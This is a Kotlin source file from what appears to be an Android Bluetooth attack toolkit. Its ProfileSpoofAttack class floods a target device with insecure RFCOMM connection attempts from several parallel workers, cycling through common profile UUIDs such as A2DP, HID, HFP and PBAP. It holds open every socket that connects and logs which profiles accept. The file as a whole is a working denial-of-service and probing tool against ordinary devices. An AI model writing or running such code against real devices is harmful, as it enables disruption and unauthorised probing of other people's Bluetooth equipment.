package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.IOException
import java.util.Collections
import java.util.UUID

/**
 * Profile Spoofing: cycles through well-known Bluetooth profile UUIDs
 * (A2DP, HID, HFP, OPP, SPP, PBAP…) and tries to establish RFCOMM channels
 * presenting itself as each profile. Serves as a service probe and, at the
 * same time, saturates the target with connection attempts.
 *
 * Limitation: modern stacks validate per-profile protocols, so the effect is
 * connection saturation + service discovery, not a true profile impersonation.
 */
class ProfileSpoofAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0
) : BluetoothAttack {

    override val displayName = AttackType.PROFILE_SPOOF.displayName
    override val description = AttackType.PROFILE_SPOOF.description

    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    private val profileUuids: List<Pair<String, UUID>> = listOf(
        "0000110A" to "A2DP Source",
        "0000110B" to "A2DP Sink",
        "0000110C" to "AVRCP",
        "0000111E" to "HFP",
        "0000111F" to "HFP AG",
        "00001124" to "HID",
        "00001105" to "OPP",
        "00001101" to "SPP",
        "00001130" to "PBAP",
    ).map { (hex, name) -> name to UUID.fromString("$hex-0000-1000-8000-00805F9B34FB") }

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }

        val workers = threads.coerceIn(1, profileUuids.size)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[SPOOF] Spoofing iniciado (objetivo $targetAddress, $workers worker(s))")
        onLog("[SPOOF] Perfiles probados: ${profileUuids.joinToString(", ") { it.first }}")

        repeat(workers) { worker ->
            scope!!.launch {
                var probe = 0
                while (isActive && running) {
                    val (name, uuid) = profileUuids[probe % profileUuids.size]
                    var socket: BluetoothSocket? = null
                    try {
                        socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                        socket.connect()
                        if (socket.isConnected) {
                            sockets.add(socket)
                            onLog("[$worker][SPOOF] ✓ Conectado presentándose como $name ($uuid)")
                        }
                    } catch (err: IOException) {
                        runCatching { socket?.close() }
                        onLog("[$worker][SPOOF] ✗ $name rechazado")
                    }
                    probe++
                    jitterDelay(rateDelayMs)
                }
            }
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        synchronized(sockets) {
            sockets.forEach { s -> runCatching { s.close() } }
            sockets.clear()
        }
    }
}
